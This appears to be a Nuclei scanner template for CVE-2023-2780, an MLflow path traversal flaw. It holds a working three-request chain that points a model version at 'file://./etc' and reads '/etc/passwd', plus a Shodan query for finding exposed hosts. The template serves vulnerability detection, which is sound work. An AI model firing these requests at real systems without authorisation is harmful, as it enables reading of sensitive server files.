http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - '"version": "([0-9.]+)",'
    type: regex
  matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /ajax-api/2.0/mlflow/registered-models/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json; charset=utf-8


    {"name":"{{randstr}}"}

    '
  - 'POST /ajax-api/2.0/mlflow/model-versions/create HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json; charset=utf-8


    {"name":"{{randstr}}","source":"file://./etc"}

    '
  - 'GET /model-versions/get-artifact?path=passwd&name={{randstr}}&version={{version}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-2780
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:lfprojects:mlflow:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-2780
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-29
    epss-percentile: 0.88199
    epss-score: 0.0217
  description: 'Path Traversal: ''\..\filename'' in GitHub repository mlflow/mlflow
    prior to 2.3.1.

    '
  impact: 'Successful exploitation could allow an attacker to read sensitive files
    on the server.

    '
  metadata:
    max-request: 3
    product: mlflow
    shodan-query: http.title:"mlflow"
    vendor: lfprojects
    verified: true
  name: Mlflow <2.3.1 - Local File Inclusion Bypass
  reference:
  - https://huntr.dev/bounties/b12b0073-0bb0-4bd1-8fc2-ec7f17fd7689/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-2780
  - https://github.com/mlflow/mlflow/commit/fae77a525dd908c56d6204a4cef1c1c75b4e9857
  remediation: 'Upgrade Mlflow to version 2.3.1 or later to mitigate the vulnerability.

    '
  severity: critical
  tags: cve2023,cve,mlflow,oss,lfi,huntr,intrusive,lfprojects
